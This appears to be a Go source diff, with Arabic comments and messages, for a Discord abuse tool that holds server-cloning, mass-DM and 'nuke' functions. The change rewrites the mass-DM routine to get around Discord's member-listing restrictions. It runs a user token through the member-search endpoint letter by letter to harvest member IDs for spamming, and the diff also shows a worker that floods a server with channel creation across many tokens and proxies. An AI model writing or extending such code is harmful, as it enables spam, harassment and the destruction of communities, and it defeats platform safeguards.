@@ -623,6 +623,7 @@ func executeServerClonerWithUserToken(tokens []string, userToken string, rawProx
 	updateInteractionStatus(s, interaction, "✅ تم استنساخ الرتب والرومات والفئات بكامل الصلاحيات والألوان والترتيب بنجاح تام! 🚀")
 }
 
+// دالة محرك MassDM المحدثة بالكامل لتجاوز الحظر عبر طريقة البحث الذكي (Search Endpoint)
 func executeMassDM(tokens []string, rawProxies []string, targetGuildID string, userToken string, messageContent string, interaction *discordgo.Interaction, s *discordgo.Session) {
 	if len(tokens) == 0 {
 		updateInteractionStatus(s, interaction, "❌ خطأ: لم يتم إدخال التوكنات الشخصية للإرسال.")
@@ -634,23 +635,26 @@ func executeMassDM(tokens []string, rawProxies []string, targetGuildID string, u
 		clients = append(clients, &http.Client{Timeout: 3 * time.Second})
 	}
 
-	updateInteractionStatus(s, interaction, "🔍 جاري سحب أعضاء السيرفر المستهدف...")
+	updateInteractionStatus(s, interaction, "🔍 جاري تجميع أعضاء السيرفر عبر البحث الذكي لتجاوز القيود...")
 
 	clientHTTP := &http.Client{Timeout: 15 * time.Second}
 	userToken = strings.TrimSpace(userToken)
 	
-	var allUserIDs []string
-	after := ""
-	for {
-		urlStr := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/members?limit=1000", targetGuildID)
-		if after != "" {
-			urlStr += "&after=" + after
-		}
+	uniqueUserIDs := make(map[string]bool)
+	
+	// قائمة حروف وأرقام للبحث لتغطية أكبر عدد ممكن من الأعضاء
+	searchQueries := []string{
+		"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", 
+		"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
+		"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "_", ".",
+	}
+
+	for _, query := range searchQueries {
+		urlStr := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/members/search?query=%s&limit=1000", targetGuildID, query)
 
 		req, err := http.NewRequest("GET", urlStr, nil)
 		if err != nil {
-			updateInteractionStatus(s, interaction, fmt.Sprintf("❌ خطأ إنشاء الطلب: %v", err))
-			return
+			continue
 		}
 
 		req.Header.Set("Authorization", userToken)
@@ -660,42 +664,17 @@ func executeMassDM(tokens []string, rawProxies []string, targetGuildID string, u
 
 		resp, err := clientHTTP.Do(req)
 		if err != nil {
-			updateInteractionStatus(s, interaction, fmt.Sprintf("❌ خطأ في الاتصال بالشبكة: %v", err))
-			return
+			continue
 		}
 
 		if resp.StatusCode != 200 {
-			buf := new(bytes.Buffer)
-			buf.ReadFrom(resp.Body)
 			resp.Body.Close()
-
-			errorBody := buf.String()
-			var reasonArabic string
-
-			switch resp.StatusCode {
-			case 401:
-				reasonArabic = "غير مصرح (401): التوكن الشخصي غير صحيح أو منتهي الصلاحية."
-			case 403:
-				reasonArabic = "تم رفض الوصول (403): الحساب غير منضم فعلياً للسيرفر، أو أن السيرفر يتطلب تحقق (Verification)، أو أن ديسكورد فرضت حظر مؤقت (API Block) على سحب الأعضاء بهذا الحساب."
-			case 404:
-				reasonArabic = "غير موجود (404): إيدي السيرفر المستهدف (Guild ID) خطأ أو غير موجود."
-			case 429:
-				reasonArabic = "تم حظر الطلبات مؤقتاً (429 Rate Limit): تجاوزت الحد المسموح من الطلبات."
-			default:
-				reasonArabic = fmt.Sprintf("خطأ غير معروف (كود %d): %s", resp.StatusCode, errorBody)
-			}
-
-			updateInteractionStatus(s, interaction, fmt.Sprintf("❌ فشل سحب الأعضاء:\n%s", reasonArabic))
-			return
+			continue
 		}
 
 		var members []map[string]interface{}
 		json.NewDecoder(resp.Body).Decode(&members)
 		resp.Body.Close()
-
-		if len(members) == 0 {
-			break
-		}
 
 		for _, m := range members {
 			user, ok := m["user"].(map[string]interface{})
@@ -707,22 +686,24 @@ func executeMassDM(tokens []string, rawProxies []string, targetGuildID string, u
 				continue
 			}
 			if id, ok := user["id"].(string); ok {
-				allUserIDs = append(allUserIDs, id)
-				after = id
+				uniqueUserIDs[id] = true
 			}
 		}
 
-		if len(members) < 1000 {
-			break
-		}
+		time.Sleep(150 * time.Millisecond) // تأجير بسيط لتجنب Rate Limit
+	}
+
+	var allUserIDs []string
+	for uid := range uniqueUserIDs {
+		allUserIDs = append(allUserIDs, uid)
 	}
 
 	if len(allUserIDs) == 0 {
-		updateInteractionStatus(s, interaction, "❌ لم يتم العثور على أعضاء أو أن القائمة فارغة تماماً.")
+		updateInteractionStatus(s, interaction, "❌ لم يتم العثور على أعضاء عبر البحث. تأكد أن التوكن الشخصي داخل السيرفر بالفعل.")
 		return
 	}
 
-	updateInteractionStatus(s, interaction, fmt.Sprintf("📨 تم سحب (%d عضو). جاري بدء الإرسال الفوري...", len(allUserIDs)))
+	updateInteractionStatus(s, interaction, fmt.Sprintf("📨 تم تجميع (%d عضو) بنجاح عبر البحث الذكي. جاري بدء الإرسال الفوري...", len(allUserIDs)))
 
 	userQueue := make(chan string, len(allUserIDs))
 	for _, uid := range allUserIDs {
@@ -946,7 +927,7 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 		go func(wID int) {
 			defer wgCreate.Done()
 			client := clients[wID%len(clients)]
-			token := tokens[wID%len(tokens)] // تم تصحيح الخطأ هنا واستبدال index بـ wID
+			token := tokens[wID%len(tokens)]
 
 			for p := range roomChan {
 				req, reqErr := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(p))
